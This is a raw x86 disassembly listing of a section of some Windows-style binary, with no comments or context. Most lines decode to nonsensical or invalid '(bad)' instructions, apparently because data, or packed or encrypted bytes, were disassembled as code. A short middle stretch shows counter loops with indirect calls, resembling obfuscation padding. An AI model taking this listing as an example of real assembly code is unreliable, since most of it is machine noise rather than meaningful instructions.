  40a631:	mov    ah,0xee
  40a633:	add    dh,cl
  40a635:	push   eax
  40a636:	mov    cs:0xe5aac7ab,eax
  40a63c:	out    0x7f,al
  40a63e:	push   ss
  40a63f:	inc    ecx
  40a640:	imul   eax,esp,0xe717c4b5
  40a646:	fdivp  st(1),st
  40a648:	repz sub BYTE PTR [ecx],ah
  40a64b:	rol    DWORD PTR [esi+ecx*8],1
  40a64e:	push   eax
  40a64f:	pop    esi
  40a650:	mov    ds:0xb05d27ee,eax
  40a655:	lods   eax,DWORD PTR ds:[esi]
  40a656:	shl    DWORD PTR [bp+0x2765],1
  40a65b:	fmul   st,st(1)
  40a65d:	fwait
  40a65e:	(bad)  
  40a65f:	cmp    BYTE PTR [ebx+ebx*4-0x40fdcd70],dh
  40a666:	or     al,0xff
  40a668:	test   eax,0xb85bdbe8
  40a66d:	lahf   
  40a66e:	popf   
  40a66f:	xchg   esp,eax
  40a670:	je     0x40a65c
  40a672:	push   ebx
  40a673:	addr16 jle 0x40a66d
  40a676:	push   edx
  40a677:	das    
  40a678:	sbb    esi,esp
  40a67a:	in     al,dx
  40a67b:	add    ebx,ecx
  40a67d:	in     al,dx
  40a67e:	ins    BYTE PTR es:[edi],dx
  40a67f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a680:	call   0x1ddeb3f9
  40a685:	mov    eax,0xd72857d4
  40a68a:	daa    
  40a68b:	out    dx,eax
  40a68c:	arpl   WORD PTR [ecx],cx
  40a68e:	mov    bh,0xfd
  40a690:	pusha  
  40a691:	mov    ah,0xf
  40a693:	(bad)  
  40a694:	sub    bh,BYTE PTR [edi-0x571920a9]
  40a69a:	xchg   BYTE PTR ds:0x94fa32ff,ch
  40a6a0:	aaa    
  40a6a1:	(bad)  
  40a6a2:	fs inc ecx
  40a6a4:	adc    bh,BYTE PTR [edi]
  40a6a6:	or     eax,0xdd1a2cde
  40a6ab:	dec    esi
  40a6ac:	in     eax,0x2e
  40a6ae:	cmc    
  40a6af:	popf   
  40a6b0:	je     0x40a714
  40a6b2:	lahf   
  40a6b3:	sbb    dl,dh
  40a6b5:	aam    0xb1
  40a6b7:	jb     0x40a6dd
  40a6b9:	aam    0x7f
  40a6bb:	lock inc edi
  40a6bd:	adc    eax,0x32354a11
  40a6c2:	pop    fs
  40a6c4:	dec    edx
  40a6c5:	xor    bh,BYTE PTR [edi+0x4a]
  40a6c8:	call   0x94c43d9e
  40a6cd:	inc    eax
  40a6ce:	test   ebx,ecx
  40a6d0:	mov    edi,edx
  40a6d2:	xchg   DWORD PTR ds:0x5d2a9526,ebp
  40a6d8:	test   al,0xcc
  40a6da:	xchg   esp,eax
  40a6db:	jl     0x40a69f
  40a6dd:	cwde   
  40a6de:	adc    BYTE PTR [ebx],0x27
  40a6e1:	outs   dx,DWORD PTR ds:[esi]
  40a6e2:	mov    ah,0x20
  40a6e4:	mov    ecx,0x1c81d9e9
  40a6e9:	cld    
  40a6ea:	and    eax,ecx
  40a6ec:	jbe    0x40a746
  40a6ee:	stos   DWORD PTR es:[edi],eax
  40a6ef:	into   
  40a6f0:	fdivr  QWORD PTR [esi+0x31]
  40a6f3:	push   edx
  40a6f4:	fnsave [edx]
  40a6f6:	pop    eax
  40a6f7:	mov    eax,0xcf775bd2
  40a6fd:	adc    BYTE PTR [bp+di],dl
  40a700:	mov    ebp,0xf9e3ee84
  40a705:	lahf   
  40a706:	mov    ds:0xc99a03b,al
  40a70b:	jo     0x40a694
  40a70d:	retf   
  40a70e:	lock pop es
  40a710:	push   esp
  40a711:	mov    edx,0x2da686ff
  40a716:	push   eax
  40a717:	sbb    DWORD PTR [eax-0x7a483d91],eax
  40a71d:	and    ebp,ebx
  40a71f:	sti    
  40a720:	push   ebp
  40a721:	xor    BYTE PTR [eax+0x7e3472e2],al
  40a727:	loop   0x40a6bb
  40a729:	popa   
  40a72a:	call   0xc365:0xd57254f1
  40a731:	cmp    ah,BYTE PTR [ebx]
  40a733:	lds    eax,FWORD PTR [edi]
  40a735:	mov    edx,DWORD PTR [edx+0x335e254a]
  40a73b:	sbb    ecx,edx
  40a73d:	xchg   ecx,eax
  40a73e:	jmp    0x40a733
  40a740:	sub    BYTE PTR [edi+0x5],ah
  40a743:	cwde   
  40a744:	xchg   ebp,eax
  40a745:	loop   0x40a6e8
  40a747:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a748:	xchg   edi,eax
  40a749:	std    
  40a74a:	arpl   WORD PTR [edi],bp
  40a74c:	aaa    
  40a74d:	push   0x48595232
  40a752:	mov    cl,ah
  40a754:	js     0x40a742
  40a756:	fucomp st(4)
  40a758:	or     bl,BYTE PTR ss:[eax+eiz*1]
  40a75c:	out    dx,al
  40a75d:	jb     0x40a7c9
  40a75f:	cmp    edx,ecx
  40a761:	int3   
  40a762:	inc    esp
  40a763:	pusha  
  40a764:	call   0xe3f2e151
  40a769:	jecxz  0x40a716
  40a76b:	mov    eax,ds:0x15907ce
  40a770:	jmp    0x40a79c
  40a772:	shl    eax,0xea
  40a775:	inc    edi
  40a776:	mov    cl,0x91
  40a778:	in     eax,0x78
  40a77a:	or     al,0x79
  40a77c:	mov    edi,0x3549aa40
  40a781:	daa    
  40a782:	pop    ebp
  40a783:	jle    0x40a7a6
  40a785:	rol    DWORD PTR [esp+ecx*8],1
  40a788:	popf   
  40a789:	inc    esi
  40a78a:	shl    esi,cl
  40a78c:	pop    ebx
  40a78d:	xchg   ebx,eax
  40a78e:	gs cdq 
  40a790:	dec    ecx
  40a791:	jns    0x40a767
  40a793:	jp     0x40a75a
  40a795:	cmp    bh,bl
  40a797:	adc    DWORD PTR [edi+0x23],ebx
  40a79a:	out    0x8e,eax
  40a79c:	sub    al,BYTE PTR [esi+0x61]
  40a79f:	(bad)  
  40a7a1:	mov    ebx,0x89010036
  40a7a6:	(bad)
  40a7a9:	cmp    ebp,0x1
  40a7ac:	cs push ecx
  40a7ae:	(bad)  
  40a7af:	lahf   
  40a7b0:	cwde   
  40a7b1:	dec    eax
  40a7b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a7b3:	mov    esi,0x4b3326b6
  40a7b8:	or     DWORD PTR [ebx-0x479ac068],esi
  40a7be:	push   0xeedf6735
  40a7c3:	shr    BYTE PTR [ebp-0x71],cl
  40a7c6:	mov    esi,0x432b66f
  40a7cb:	add    edx,DWORD PTR [esi-0x5c]
  40a7ce:	mov    ?,WORD PTR [esi+0x53]
  40a7d1:	inc    bh
  40a7d3:	cmp    al,0x50
  40a7d5:	xor    al,0x40
  40a7d7:	mov    gs,esp
  40a7d9:	xor    eax,0xc19a86ad
  40a7de:	xor    ebp,ebp
  40a7e0:	sbb    dl,cl
  40a7e2:	add    ah,BYTE PTR [eax-0x1a07fb96]
  40a7e8:	and    al,0xdf
  40a7ea:	push   esi
  40a7eb:	mov    al,ds:0x9a747924
  40a7f0:	jmp    0xa5163505
  40a7f5:	shl    DWORD PTR [eax-0x3697186],0xa0
  40a7fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a7fd:	push   cs
  40a7fe:	adc    esp,esp
  40a800:	(bad)  
  40a801:	neg    eax
  40a803:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  40a805:	sub    BYTE PTR [ebp-0x6a3b855e],bh
  40a80b:	adc    al,0x19
  40a80d:	mov    ecx,0x2f0136f8
  40a812:	aam    0x3f
  40a814:	rol    DWORD PTR [edx+0x894221b],1
  40a81a:	xchg   edx,eax
  40a81b:	shr    DWORD PTR [edx],cl
  40a81d:	mov    ch,0xd4
  40a81f:	xchg   edx,eax
  40a820:	idiv   DWORD PTR [eax+0x76]
  40a823:	dec    ebp
  40a824:	js     0x40a801
  40a826:	rcl    DWORD PTR [ebp-0x3e],cl
  40a829:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a82a:	scas   eax,DWORD PTR es:[edi]
  40a82b:	imul   ebp,DWORD PTR [ecx+0x29],0x56
  40a82f:	or     DWORD PTR [esi+0x7ad10775],edx
  40a835:	or     ecx,ebx
  40a837:	ds sahf 
  40a839:	sub    al,0x1c
  40a83b:	mov    cl,0xea
  40a83d:	int    0x26
  40a83f:	(bad)  
  40a840:	aaa    
  40a841:	ficom  WORD PTR [ebp+edi*1+0x7dc9410a]
  40a848:	gs sbb eax,0x8d17ba30
  40a84e:	inc    ebp
  40a84f:	call   0x821ceddd
  40a854:	xor    eax,0x4302dd
  40a859:	adc    ebx,DWORD PTR [edi+0x0]
  40a85c:	add    BYTE PTR [ebx+0x2581e845],cl
  40a862:	jmp    0x40eb69
  40a867:	add    BYTE PTR [eax],al
  40a869:	add    cl,ch
  40a86b:	or     eax,0x8b000000
  40a870:	sbb    eax,0x4302e9
  40a875:	inc    ebx
  40a876:	mov    DWORD PTR ds:0x4302e9,ebx
  40a87c:	cmp    DWORD PTR ds:0x4302e9,0x10
  40a883:	jae    0x40a8ac
  40a889:	cmp    DWORD PTR ds:0x4302e9,0x13
  40a890:	jne    0x40a8a1
  40a896:	push   0x42e77b
  40a89b:	call   DWORD PTR ds:0x42eabf
  40a8a1:	jmp    0x40a86f
  40a8a6:	and    DWORD PTR ds:0x4302e5,edx
  40a8ac:	mov    ecx,DWORD PTR [ebp-0x24]
  40a8af:	xor    eax,esi
  40a8b1:	add    DWORD PTR ds:0x43036b,0x2a87
  40a8bb:	add    eax,edi
  40a8bd:	sub    ebx,DWORD PTR ds:0x4302ed
  40a8c3:	mov    DWORD PTR [ecx],eax
  40a8c5:	and    DWORD PTR ds:0x42e654,0x0
  40a8cf:	jmp    0x40a8e1
  40a8d4:	mov    ebx,DWORD PTR ds:0x42e654
  40a8da:	inc    ebx
  40a8db:	mov    DWORD PTR ds:0x42e654,ebx
  40a8e1:	cmp    DWORD PTR ds:0x42e654,0x1d
  40a8e8:	jae    0x40ac77
  40a8ee:	cmp    DWORD PTR ds:0x42e654,0x11
  40a8f5:	jne    0x40a90b
  40a8fb:	push   0x2475
  40a900:	push   0x8142
  40a905:	call   DWORD PTR ds:0x42e887
  40a90b:	cmp    DWORD PTR ds:0x42e654,0x10
  40a912:	jne    0x40a925
  40a918:	mov    ebx,DWORD PTR ds:0x42e654
  40a91e:	inc    ebx
  40a91f:	mov    DWORD PTR ds:0x42e654,ebx
  40a925:	jmp    0x40a8d4
  40a92a:	jmp    0x40ac77
  40a92f:	fsubr  QWORD PTR [esi-0x17]
  40a932:	or     eax,0x6fd88969
  40a937:	pop    eax
  40a938:	or     BYTE PTR [edx-0x2d311f87],bl
  40a93e:	pushf  
  40a93f:	cdq    
  40a940:	loope  0x40a9c0
  40a942:	jle    0x40a972
  40a944:	jge    0x40a9c4
  40a946:	jle    0x40a9ab
  40a948:	bound  esp,QWORD PTR [esi-0x7ef3cf8c]
  40a94e:	xchg   esp,eax
  40a94f:	arpl   WORD PTR [eax-0x56],bx
  40a952:	xchg   ebp,eax
  40a953:	jb     0x40a93e
  40a955:	imul   esi,DWORD PTR [edi+0xc],0x6a
  40a959:	xor    DWORD PTR ss:[esi],ecx
  40a95c:	sahf   
  40a95d:	lods   al,BYTE PTR ds:[esi]
  40a95e:	rcr    DWORD PTR [edi+0x75],1
  40a961:	adc    al,0x36
  40a963:	retf   0x135b
  40a966:	stos   BYTE PTR es:[edi],al
  40a967:	or     al,BYTE PTR [edi]
  40a969:	xchg   esi,eax
  40a96a:	mov    esi,0xecd4ca3e
  40a96f:	or     DWORD PTR [edx-0x2b],esi
  40a972:	ins    BYTE PTR es:[edi],dx
  40a973:	pop    ecx
  40a974:	mov    dl,0xf9
  40a976:	js     0x40a920
  40a978:	add    DWORD PTR [edx-0x54],edi
  40a97b:	inc    esp
  40a97c:	enter  0x9e0b,0xc1
  40a980:	inc    eax
  40a981:	out    dx,al
  40a982:	clc    
  40a983:	add    BYTE PTR [esi+0x48176c25],0x82
  40a98a:	daa    
  40a98b:	mov    ebp,0x6e272f80
  40a990:	xchg   esi,eax
  40a991:	mov    eax,0x4b4f654a
  40a996:	lods   eax,DWORD PTR ds:[esi]
  40a997:	shl    DWORD PTR [edi-0x5b8274f7],cl
  40a99d:	xlat   BYTE PTR ds:[ebx]
  40a99e:	(bad)  
  40a9a0:	stos   BYTE PTR es:[edi],al
  40a9a1:	js     0x40a934
  40a9a3:	push   0xffffffb9
  40a9a5:	xor    DWORD PTR ds:0xd3f399cc,ebx
  40a9ab:	imul   ecx,DWORD PTR ds:0x91771149,0x7
  40a9b2:	sbb    ecx,DWORD PTR [esi]
  40a9b4:	(bad)  
  40a9b5:	mov    esp,0xdeb24247
  40a9ba:	push   0x5c
  40a9bc:	fs xchg edx,eax
  40a9be:	jl     0x40aa33
  40a9c0:	clc    
  40a9c1:	push   ss
  40a9c2:	xor    al,0xe8
  40a9c4:	int3   
  40a9c5:	sbb    esp,esi
  40a9c7:	mov    WORD PTR [ebx],gs
  40a9c9:	inc    edi
  40a9ca:	mov    eax,0xcd911355
  40a9cf:	or     edi,DWORD PTR [ebx-0x1553b012]
  40a9d5:	cmp    al,0x4
  40a9d7:	mov    al,ds:0x246328e3
  40a9dc:	outs   dx,DWORD PTR ds:[esi]
  40a9dd:	lods   eax,DWORD PTR ds:[esi]
  40a9de:	pop    es
  40a9df:	or     edi,esp
  40a9e1:	jmp    FWORD PTR [edx+0x8ab1193]
  40a9e7:	or     BYTE PTR [eax+0x6c],0x77
  40a9eb:	mov    bl,BYTE PTR [esi]
  40a9ed:	cmp    edi,DWORD PTR [ecx]
  40a9ef:	out    0x58,eax
  40a9f1:	int    0x80
  40a9f3:	sub    al,0x65
  40a9f5:	cmp    ebp,edi
  40a9f7:	or     ah,BYTE PTR [edi-0x40]
  40a9fa:	sbb    al,0x65
  40a9fc:	imul   edx,DWORD PTR [edx+0x62db6a2b],0x6d
  40aa03:	pop    es
  40aa04:	jae    0x40a9f6
  40aa06:	sahf   
  40aa07:	xchg   ebx,eax
  40aa08:	ds aaa 
  40aa0a:	jmp    0x85303768
  40aa0f:	pop    esi
  40aa10:	mov    eax,0x3178d1a1
  40aa15:	in     eax,dx
  40aa16:	mov    bh,0x24
  40aa18:	xor    ebp,DWORD PTR [ecx-0x63]
  40aa1b:	inc    ebp
  40aa1c:	mov    al,0xaa
  40aa1e:	add    BYTE PTR [eax],bl
  40aa20:	mov    WORD PTR [ebp+ebp*2+0x15],gs
  40aa24:	call   0x44d959c1
  40aa29:	aad    0x71
  40aa2b:	fidiv  WORD PTR [esi-0x7aa019f8]
  40aa31:	in     al,0x17
  40aa33:	enter  0x2da8,0x35
  40aa37:	xor    bh,dl
  40aa39:	ror    DWORD PTR [ecx],0x45
  40aa3c:	xor    BYTE PTR [edi+edx*2-0x44],0x33
  40aa41:	pop    esp
  40aa42:	mov    bh,0x3b
  40aa44:	aas    
  40aa45:	jle    0x40aa30
  40aa47:	push   cs
  40aa48:	xor    BYTE PTR [ebx-0x18],dh
  40aa4b:	ja     0x40aa6c
  40aa4d:	dec    ecx
  40aa4e:	in     al,0x3c
  40aa50:	pop    ss
  40aa51:	fcomp  DWORD PTR [esi+0x14]
  40aa54:	ins    BYTE PTR es:[edi],dx
  40aa55:	lock dec esp
  40aa57:	pop    ebp
  40aa58:	and    ebx,DWORD PTR [eax-0x67]
  40aa5b:	mov    bl,0xd0
  40aa5d:	shr    BYTE PTR [ebx+0x79],1
  40aa60:	mov    ds:0x77b7391a,al
  40aa65:	or     eax,0x95302525
  40aa6a:	pop    esp
  40aa6b:	mov    ah,0x5d
  40aa6d:	ss xchg ebx,eax
  40aa6f:	or     al,0x61
  40aa71:	fmul   QWORD PTR [esi]
  40aa73:	cmp    al,0x1c
  40aa75:	add    BYTE PTR [esi-0x471be5dc],dl
  40aa7b:	xor    edi,DWORD PTR [edx-0x48]
  40aa7e:	lahf   
  40aa7f:	imul   ecx,DWORD PTR [ebp+0x6e8a52b],0x16240dd1
  40aa89:	sbb    dl,BYTE PTR [esi]
  40aa8b:	sub    ebp,esi
  40aa8d:	in     eax,0xa2
  40aa8f:	fs jae 0x40aab8
  40aa92:	cmp    DWORD PTR [edi],ebx
  40aa94:	ins    DWORD PTR es:[edi],dx
  40aa95:	shr    dl,0x33
  40aa98:	lds    ebp,FWORD PTR [edx-0x459f946]
  40aa9e:	and    ah,BYTE PTR [eax]
  40aaa0:	mov    ebp,0x2289d319
  40aaa5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aaa6:	test   BYTE PTR [edi],dl
  40aaa8:	cmp    DWORD PTR [ebp-0x4],esi
  40aaab:	jne    0x40ab24
  40aaad:	repnz mov al,0x7a
  40aab0:	(bad)  
  40aab1:	lea    edi,[ebp-0x67]
  40aab4:	mov    ds:0x3afe04f0,al
  40aab9:	jmp    0xbf14:0x799c5e4b
  40aac0:	daa    
  40aac1:	dec    edi
  40aac2:	xor    DWORD PTR [edi],edx
  40aac4:	ins    BYTE PTR es:[edi],dx
  40aac5:	push   esi
  40aac6:	xor    dh,0x79
  40aac9:	jns    0x40aaf0
  40aacb:	sub    BYTE PTR [ecx+ebp*4],al
  40aace:	fucomip st,st(3)
  40aad0:	xor    al,BYTE PTR [eax]
  40aad2:	repz dec edx
  40aad4:	ins    BYTE PTR es:[edi],dx
  40aad5:	inc    esi
  40aad6:	adc    esp,0x5c
  40aad9:	adc    eax,0x7d1451d8
  40aade:	push   ebp
  40aadf:	xchg   DWORD PTR [edi],edi
  40aae1:	add    DWORD PTR [ecx+0x56],esi
  40aae4:	xchg   DWORD PTR [edi+0x4ac6ea6],ebx
  40aaea:	popa   
  40aaeb:	fstp   QWORD PTR fs:[ecx]
  40aaee:	jno    0x40ab07
  40aaf0:	xor    ecx,DWORD PTR ds:0x23cd306c
  40aaf6:	fiadd  WORD PTR [edx+0x4a]
  40aaf9:	mov    BYTE PTR [esi+0xd],bl
  40aafc:	loopne 0x40ab6d
  40aafe:	mov    edi,0x7c188f2a
  40ab03:	pop    esp
  40ab04:	dec    ecx
  40ab05:	(bad)  
  40ab06:	mov    cl,BYTE PTR [eax]
  40ab08:	lea    esi,[ebx+0x68]
  40ab0b:	sub    dh,bl
  40ab0d:	jle    0x40ab47
  40ab0f:	dec    esp
  40ab10:	or     dh,BYTE PTR [esi-0x1e82781e]
  40ab16:	mov    ch,0x39
  40ab18:	ss sbb al,0x3f
  40ab1b:	mov    ds:0xc12b321e,eax
  40ab20:	push   ds
  40ab21:	int3   
  40ab22:	stc    
  40ab23:	cld    
  40ab24:	loopne 0x40ab1d
  40ab26:	pop    edx
  40ab27:	xlat   BYTE PTR ds:[ebx]
  40ab28:	push   cs
  40ab29:	mov    eax,0x2758c4b5
  40ab2e:	mov    al,ds:0xbd9ac621
  40ab33:	retf   0x1ce8
  40ab36:	cwde   
  40ab37:	inc    ebp
  40ab38:	aam    0xe3
  40ab3a:	mov    esi,0x17310d38
  40ab3f:	xor    BYTE PTR [edx-0x57e59589],bh
  40ab45:	inc    ebp
  40ab46:	dec    edi
  40ab47:	sbb    dh,BYTE PTR [ebp+0x7d]
  40ab4a:	cs aam 0xcf
  40ab4d:	cld    
  40ab4e:	out    0x29,eax
  40ab50:	ror    BYTE PTR [eax-0x68],0x2b
  40ab54:	test   eax,0xcb6a8d1b
  40ab59:	fcom   DWORD PTR [ebx+0x120a02e2]
  40ab5f:	sahf   
  40ab60:	xchg   edx,eax
  40ab61:	sysret 
  40ab63:	daa    
  40ab64:	outs   dx,BYTE PTR ds:[esi]
  40ab65:	inc    eax
  40ab66:	jns    0x40ab66
  40ab68:	xor    DWORD PTR [ebp-0x3562ac31],esi
  40ab6e:	dec    esp
  40ab6f:	dec    esp
  40ab70:	push   esp
  40ab71:	inc    esp
  40ab72:	jecxz  0x40ab26
  40ab74:	mov    WORD PTR [bx+si-0x66],gs
  40ab78:	inc    ebp
  40ab79:	ja     0x40ab3f
  40ab7b:	mov    edi,0xb1df3d9e
  40ab80:	sbb    eax,0x165988e4
  40ab85:	jb     0x40aba6
  40ab87:	mov    esp,0xeb08e0f6
  40ab8c:	mov    al,0xb8
  40ab8e:	into   
  40ab8f:	or     eax,0x494ab211
  40ab94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ab95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ab96:	ins    BYTE PTR es:[edi],dx
  40ab97:	retf   
  40ab98:	ds sahf 
  40ab9a:	data16 jbe 0x40ab4a
  40ab9d:	jg     0x40abbf
  40ab9f:	shl    DWORD PTR [ebx+0x4b152bcc],cl
  40aba5:	inc    ecx
  40aba6:	out    0x48,eax
  40aba8:	mov    ?,WORD PTR [esi+eiz*4-0x3419ebf3]
  40abaf:	mov    ds:0x1f28adf3,eax
  40abb4:	jne    0x40aba5
  40abb6:	stc    
  40abb7:	xchg   ecx,eax
  40abb8:	lea    edx,[esi+0x5f]
  40abbb:	mov    eax,ds:0xdffcb1cd
  40abc0:	jae    0x40ac34
  40abc2:	xchg   esi,eax
  40abc3:	outs   dx,DWORD PTR ds:[esi]
  40abc4:	popa   
  40abc5:	xor    al,0x7c
  40abc7:	imul   esi,ebx,0xffffff86
  40abca:	jne    0x40ac4a
  40abcc:	sbb    eax,0x2a73c3c1
  40abd1:	es push ds
  40abd3:	fidiv  WORD PTR [eax]
  40abd5:	into   
  40abd6:	add    eax,0x1c2e48ce
  40abdb:	mov    ch,0x84
  40abdd:	das    
  40abde:	leave  
  40abdf:	dec    eax
  40abe0:	xchg   DWORD PTR [ebp-0x3e9421e7],ecx
  40abe6:	outs   dx,BYTE PTR ds:[esi]
  40abe7:	mov    edi,esi
  40abe9:	and    eax,DWORD PTR [edi]
  40abeb:	pop    ebp
  40abec:	jbe    0x40ab72
  40abee:	retf   
  40abef:	mov    esi,0x1423fae
  40abf4:	gs inc eax
  40abf6:	pop    ss
  40abf7:	ret    
  40abf8:	lods   eax,DWORD PTR ds:[esi]
  40abf9:	mov    ds:0x21767eb0,eax
  40abfe:	out    dx,eax
  40abff:	mov    BYTE PTR [eax+0x2ee415b2],0xf
  40ac06:	les    edi,FWORD PTR [ebp-0x6679be63]
  40ac0c:	test   BYTE PTR [ebx],cl
  40ac0e:	dec    esp
  40ac0f:	push   ebp
  40ac10:	push   ebp
  40ac11:	ja     0x40ac6e
  40ac13:	mov    eax,0x42b2b5f7
  40ac18:	hlt    
  40ac19:	push   esp
  40ac1a:	(bad)  
  40ac1c:	inc    ebx
  40ac1d:	adc    al,0xbe
  40ac1f:	cmp    DWORD PTR ds:0xf47e9e2d,ebp
  40ac25:	inc    ecx
  40ac26:	call   0xbc2ec3b8
  40ac2b:	adc    eax,0x26cd2592
  40ac30:	push   ebp
  40ac31:	leave  
  40ac32:	test   edi,ecx
  40ac34:	inc    edi
  40ac35:	jle    0x40abbb
  40ac37:	cli    
  40ac38:	inc    esi
  40ac39:	sar    BYTE PTR [eax],1
  40ac3b:	sub    BYTE PTR [esi+0x75],ch
  40ac3e:	mov    esp,0x24bb4f57
  40ac43:	into   
  40ac44:	(bad)
  40ac47:	xor    edx,edx
  40ac49:	sub    eax,0x499ee473
  40ac4e:	enter  0x3907,0x79
  40ac52:	je     0x40abf6
  40ac54:	jmp    0x40ac87
  40ac56:	lds    edx,FWORD PTR [ebp+0x5a]
  40ac59:	int    0xf9
  40ac5b:	leave  
  40ac5c:	ret    
  40ac5d:	jb     0x40ac91
  40ac5f:	or     BYTE PTR [esi+0x1a809a22],dh
  40ac65:	add    dl,BYTE PTR [ebx]
  40ac67:	pop    edi
  40ac68:	or     al,0x4b
  40ac6a:	push   DWORD PTR [esi-0x78]
  40ac6d:	(bad)  ds:0xb3829e04
  40ac73:	repz fistp QWORD PTR [edx+0x227ca19c]
  40ac7a:	inc    ecx
  40ac7b:	add    BYTE PTR [ebx-0x71ed0148],bh
  40ac81:	jmp    0x40afce
  40ac86:	leave  
  40ac87:	inc    edx
  40ac88:	mov    ebp,0xd1515553
  40ac8d:	inc    eax
  40ac8e:	xor    ch,ah
  40ac90:	icebp  
  40ac91:	pushf  
  40ac92:	jle    0x40ac7a
  40ac94:	out    0x21,al
  40ac96:	dec    ecx
  40ac97:	in     al,dx
  40ac98:	jle    0x40ad18
  40ac9a:	cs jge 0x40ad1b
  40ac9d:	jle    0x40ac61
  40ac9f:	sti    
  40aca0:	fdivp  st(2),st
  40aca2:	xchg   ebp,eax
  40aca3:	lods   al,BYTE PTR ds:[esi]
  40aca4:	mov    edi,0xe3ff079e
  40aca9:	xor    al,0x2e
  40acab:	cs dec ecx
  40acad:	inc    eax
  40acae:	xchg   ebx,eax
  40acaf:	push   ss
  40acb0:	jo     0x40ac78
  40acb2:	mov    bl,0xda
  40acb4:	in     al,dx
  40acb5:	or     eax,0xb7222c60
  40acba:	add    BYTE PTR [edi-0x64c55e40],bh
  40acc0:	mov    bl,0xec
  40acc2:	sbb    edi,DWORD PTR [ebp+eax*4-0x4]
  40acc6:	sub    cl,ch
  40acc8:	xor    BYTE PTR [ebp-0x1527245f],0xec
  40accf:	and    DWORD PTR [edx+0x6f],esp
  40acd2:	dec    ebp
  40acd3:	loop   0x40ad2e
  40acd5:	and    eax,0x32a351
  40acda:	in     eax,dx
  40acdb:	in     eax,0xc1
  40acdd:	sub    BYTE PTR [edi-0x41de8e12],0x44
  40ace4:	pop    edi
  40ace5:	(bad)  
  40ace6:	jae    0x40ad5d
  40ace8:	mov    ah,0x25
  40acea:	cwde   
  40aceb:	mov    eax,0xa56faec6
  40acf0:	xor    esp,0xffffffb6
  40acf3:	iret   
  40acf4:	xor    al,BYTE PTR [ebx-0x7a]
  40acf7:	int3   
  40acf8:	and    DWORD PTR [esi],eax
  40acfa:	nop
  40acfb:	jmp    0xcc96a658
  40ad00:	(bad)  
  40ad02:	mov    cl,BYTE PTR [ebx]
  40ad04:	mov    ds:0x1b006990,al
  40ad09:	mov    ?,WORD PTR [ecx+edx*2-0x7]
  40ad0d:	push   ecx
  40ad0e:	lock aad 0xb5
  40ad11:	add    edx,0xffffff83
  40ad14:	test   BYTE PTR [edi+0x521465c9],ah
  40ad1a:	mov    ah,0x43
  40ad1c:	add    DWORD PTR [esi-0x31ec0c19],eax
  40ad22:	sub    ch,BYTE PTR [edi]
  40ad24:	jae    0x40acb4
  40ad26:	adc    bl,BYTE PTR [edx]
  40ad28:	stc    
  40ad29:	sub    esp,DWORD PTR cs:[edx]
  40ad2c:	sbb    BYTE PTR [edi+ebp*2-0x54],cl
  40ad30:	pop    ebp
  40ad31:	in     eax,0x7d
  40ad33:	mov    ds:0x832ac1ab,al
  40ad38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ad39:	push   edi
  40ad3a:	fcom   QWORD PTR [ebx+0x6601a1a6]
  40ad40:	mov    ds,edi
  40ad42:	jmp    0x40ad9c
  40ad44:	out    dx,al
  40ad45:	inc    esp
  40ad46:	imul   ebp,DWORD PTR [esi],0xac691b86
  40ad4c:	cmp    ebp,DWORD PTR [eax-0x68]
  40ad4f:	retf   
  40ad50:	mov    BYTE PTR [ecx+0x7edca0c2],dh
  40ad56:	imul   ebx,edx,0x34
  40ad59:	jmp    0x6656:0xa3c1e03a
  40ad60:	out    0xf9,al
  40ad62:	sub    esp,DWORD PTR [esi+0x1ce7645e]
  40ad68:	pop    esp
  40ad69:	jmp    0x11bdb10
  40ad6e:	fmul   DWORD PTR [ebp-0x49]
  40ad71:	dec    eax
  40ad72:	sbb    edx,DWORD PTR [ecx]
  40ad74:	mov    eax,0x3106feeb
  40ad79:	popf   
  40ad7a:	(bad)  
  40ad7b:	pop    ss
  40ad7c:	push   ds
  40ad7d:	arpl   WORD PTR [ebp+0x682c1654],si
  40ad83:	jge    0x40ad35
  40ad85:	sub    DWORD PTR [edx-0x44873c84],ecx
  40ad8b:	fld    DWORD PTR [edi]
  40ad8d:	sbb    ch,0xfb
  40ad90:	inc    ebx
  40ad91:	(bad)  
  40ad92:	ins    BYTE PTR es:[edi],dx
  40ad93:	fidiv  DWORD PTR [ebx-0x5bec6c9c]
  40ad99:	jge    0x40ade0
  40ad9b:	shl    BYTE PTR fs:[esi-0x20],0x6
  40ada0:	mov    bh,ah
  40ada2:	jl     0x40ad82
  40ada4:	mov    ebp,ss
  40ada6:	mov    ds:0x2baca892,eax
  40adab:	mov    ds:0xb90f43d9,al
  40adb0:	sub    eax,DWORD PTR ds:0x314a8bd
  40adb6:	xchg   ebx,eax
  40adb7:	cld    
  40adb8:	pushf  
  40adb9:	call   0x8c918b1e
  40adbe:	retf   0xeebe
  40adc1:	or     BYTE PTR [ebp-0x32],bh
  40adc4:	add    al,0x33
  40adc6:	dec    ecx
  40adc7:	scas   eax,DWORD PTR es:[edi]
  40adc8:	retf   0xf4d2
  40adcb:	std    
  40adcc:	outs   dx,BYTE PTR ds:[esi]
  40adcd:	add    BYTE PTR [eax],0x3d
  40add0:	popf   
  40add1:	jns    0x40ae0c
  40add3:	arpl   WORD PTR [edi+0x99f7912],si
  40add9:	fwait
  40adda:	lods   eax,DWORD PTR ds:[esi]
  40addb:	rol    ch,cl
  40addd:	add    esi,ebx
  40addf:	xchg   ecx,eax
  40ade0:	mov    bl,0xf5
  40ade2:	iret   
  40ade3:	imul   ebx,ebp,0x3
  40ade6:	mov    bl,BYTE PTR [ebx+0x53]
  40ade9:	jl     0x40ad82
  40adeb:	inc    ebx
  40adec:	(bad)  
  40aded:	loopne 0x40add7
  40adef:	jne    0x40ae23
  40adf1:	xchg   esi,eax
  40adf2:	repz push ebx
  40adf4:	mov    ds:0x5276d87d,eax
  40adf9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40adfa:	add    ah,BYTE PTR [edx+0x10]
  40adfd:	outs   dx,BYTE PTR ds:[esi]
